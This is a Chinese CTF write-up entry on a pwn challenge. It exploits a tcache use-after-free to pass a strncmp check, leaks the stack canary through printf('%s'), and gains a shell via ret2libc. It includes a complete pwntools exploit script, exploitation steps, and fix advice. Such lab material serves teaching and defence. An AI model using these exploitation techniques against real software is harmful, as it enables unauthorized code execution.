---
id: ctf-pwn-tcache-uaf-reclaim-strncmp-bypass-printf-canary-leak-ret2libc
title: tcache UAF 回收已 free chunk 绕过 strncmp + printf("%s") 越界读 canary + ret2libc
type: scenario
domain: ctf
path: ctf/pwn
technique: tcache-uaf-reclaim-strncmp-bypass-printf-overread-canary-ret2libc
aliases:
- BossDontNeedKey
- UAF 回收绕过 strncmp
- free 后继续比较
- printf %s 越界读 canary
- rand 堆题
- tcache 同大小回收
tags:
- ctf
- pwn
- heap
- tcache
- uaf
- strncmp
- canary
- leak
- ret2libc
- glibc-2.31
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V203
  verified_at: '2026-11-07T02:17:13+08:00'
  notes: 已对照原文核对：free(ptr) 后 strncmp('BossDontNeedKey')、0x58 同尺寸 tcache 回收、0x29 字节溢出 canary 低字节 + printf('%s') 泄露、u64-0x61、ret2libc 二次溢出，与原文 IDA/exp 一致。未验证点：未本机复跑；原文无受影响版本；frontmatter 无 sources/source_url。
---

## 一句话结论

程序把 `ptr` 指向的堆块 `free` 后仍用同一指针做 `strncmp(ptr, "BossDontNeedKey", ...)` 校验；先申请同尺寸堆块把该 chunk 从 tcache 取回并写入期望字符串，即可通过校验进入后面的 `read + printf("%s")` 栈缓冲区；利用未终止字符串越过 `buf` 读到 canary 的 NUL 终止处泄露 canary，再用第二次 `read` 溢出构造 ret2libc。

## 原理

- **校验逻辑的 UAF**：`sub_401369` 中 `ptr = malloc(rand() % 100); ...; free(ptr);` 之后仍执行 `strncmp((const char *)ptr, "BossDontNeedKey", 0xFF)`。`free` 只把 chunk 放回 tcache，`ptr` 仍是悬空指针；随后程序让用户输入 key size 并 `malloc(v2)`。若 `v2` 对应同一个 tcache bin（本例申请 0x58 字节即可命中原 chunk），`malloc` 会返回同一地址，用户输入的 key content 就写进了 `ptr` 指向的内存，`strncmp` 自然相等，`seed` 保持 6666。
- **进入漏洞分支**：`main` 在 `seed == 6666` 时执行 `read(0, buf, 0x100)`（`buf[40]`）、`printf("%s is a good choice!\n", buf)`、再次 `read(0, buf, 0x100)`。第一次 read 不补 `\0`，`printf("%s")` 会从 `buf` 一直打印到遇到 NUL。
- **canary 泄露**：x86-64 canary 最低字节固定为 `0x00`。发送 `0x29` 个 `'a'` 后，`printf` 输出 0x28 个 `'a'`、第 0x29 个 `'a'`，然后继续输出 canary 的 7 个非零字节并在 canary 的 NUL 处停止。接收端以 0x28 个 `'a'` 为界，再读 8 字节，`u64(...) - 0x61` 即得完整 canary（首字节是最后的 `'a'`）。
- **二次溢出**：第二次 `read` 把 `0x28` 字节填充 + `p64(canary)*2`（canary 与 saved rbp）+ `pop rdi; ret` + `puts@got` + `puts@plt` + `main` 写回，函数返回时泄露 libc 的 `puts` 地址；回到 main 后重复 UAF 绕过，再用 `system("/bin/sh")` 的 ROP 链拿 shell。
- **随机门控**：进入校验前有一个 `while` 循环调用 `rand()%100`，只有 `<=5` 才跳出；每次重跑所需迭代次数不同，exp 用固定次数的“输入 key”循环来同步。

## 触发条件

- glibc 带 tcache（2.26+，本例 2.31）且程序 `free` 后不清空指针。
- `free` 后的指针仍被用作字符串比较/解引用，且攻击者能在比较前申请到同尺寸堆块并控制内容。
- 后续存在 `read` 不补 NUL + `printf("%s", buf)`/`puts(buf)` 的栈缓冲区，且同一函数内还有第二次 `read` 可溢出。
- 二进制开启 Canary，但未开启 PIE 或可先泄代码基址；有 libc 可泄露（本例通过 `puts@got`）。
- 目标是 64 位 Linux，栈对齐与 libc 版本已知。

## 利用步骤

1. 逆向确认 `free(ptr)` 后仍 `strncmp(ptr, "BossDontNeedKey", 0xFF)`；确定 `ptr` 原始 `malloc` 的尺寸范围，用调试器（gdb/pwndbg）查看 `bins`，找到能命中同一 tcache bin 的申请大小（本例 0x58）。
2. 准备堆块回收：在 key size 输入处发送 0x58，在 key content 处发送 `BossDontNeedKey`；若随机门控未放行，重复该输入直到进入 `seed==6666` 分支。
3. 泄露 canary：发送 `b"a"*0x29`；从输出中先收 0x28 个 `'a'`，再读 8 字节，计算 `canary = u64(leak) - 0x61`。
4. 第一次溢出：`b"a"*0x28 + p64(canary)*2 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)`；解析 `puts` 实际地址，减去 libc 偏移得到 `libc_base`。
5. 回到 main 后重复步骤 1-2 的 UAF 绕过；第二次溢出用 `p64(canary)*2 + p64(pop_rdi) + p64(binsh) + p64(pop_rdi+1) + p64(system)`（多一个 `ret` 对齐）。
6. 拿 shell 后执行 `id; cat flag` 验证。

## PoC

```python
from pwn import *
context(arch='amd64', log_level='debug')
p = process('./rand')
elf = ELF('./rand')
libc = ELF('./libc.so.6')          # 题目 libc 2.31

def bypass():
    for _ in range(20):            # 同步随机门控
        p.recvuntil(b"Enter the lucky number:")
        p.sendline(b"10000")
        p.recvuntil(b"Enter the key size:")
        p.sendline(b"88")          # 0x58，命中被 free 的 chunk
        p.recvuntil(b"Enter the key content:")
        p.sendline(b"BossDontNeedKey")
        try:
            p.recvuntil(b"What to eat tonight?\n", timeout=1)
            return
        except EOFError:
            continue

bypass()
p.send(b"a"*0x29)
p.recvuntil(b"a"*0x28)
canary = u64(p.recv(8).ljust(8, b"\x00")) - 0x61
pop_rdi = 0x401703
p.send(b"a"*0x28 + p64(canary)*2 + p64(pop_rdi) +
       p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x401130))
puts = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc_base = puts - libc.sym['puts']

# 第二轮：重复 bypass 后 system("/bin/sh")
bypass()
p.send(b"a"*0x29)
p.recvuntil(b"a"*0x28)
canary = u64(p.recv(8).ljust(8, b"\x00")) - 0x61
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
system = libc_base + libc.sym['system']
p.send(b"a"*0x28 + p64(canary)*2 + p64(pop_rdi) +
       p64(binsh) + p64(pop_rdi+1) + p64(system))
p.interactive()
```

## 变体与关联

- 变体：若 `strncmp` 长度有限或比较的是堆块头部字段，可改为部分覆盖（如只写前 16 字节）；若 tcache 被禁用，可改用 fastbin/unsorted bin 回收。
- 变体：canary 泄露也可用 `puts(buf)`、`write(1,buf,n)` 等任意字符串输出点；若 canary 中间字节为 `0x00`，重开进程重试。
- 关联：[[binary-pwn-stack-canary-lowbyte-nul-overwrite-string-leak]]（canary NUL 泄露原理）、[[ctf-pwn-format-canary-uaf-unsorted-ret2libc-all-protections]]（UAF+unsorted+ret2libc 组合）、[[binary-pwn-heap-strcmp-bytewise-libc-pointer-leak]]（strcmp/strncmp 与指针泄露的另一类用法）。
- 边界：`free` 后指针若被置空或比较前被重新赋值，UAF 绕过不成立；申请尺寸必须落在同一 tcache bin（含 chunk 头后的实际大小）；glibc 2.32+ 的 safe-linking 需要先泄堆地址。

## 检测与防御

- 检测（CTF）：观察到 `free` 后仍调用 `strncmp`/`strlen`/`printf` 的悬空指针；随机门控循环后紧跟 UAF 检查；同一函数内有两次 `read` 且第一次不补 NUL。
- 修复：`free` 后立即把指针置 `NULL`；比较前重新分配并初始化；`read` 后显式补 `\0`，输出用 `printf("%s", buf)` 的固定长度或 `write`；开启 PIE/Full RELRO 并保持 Canary。
- 加固：使用带 tcache 保护的 glibc 或 safe-linking；对关键校验使用常量时间比较并校验对象生命周期。
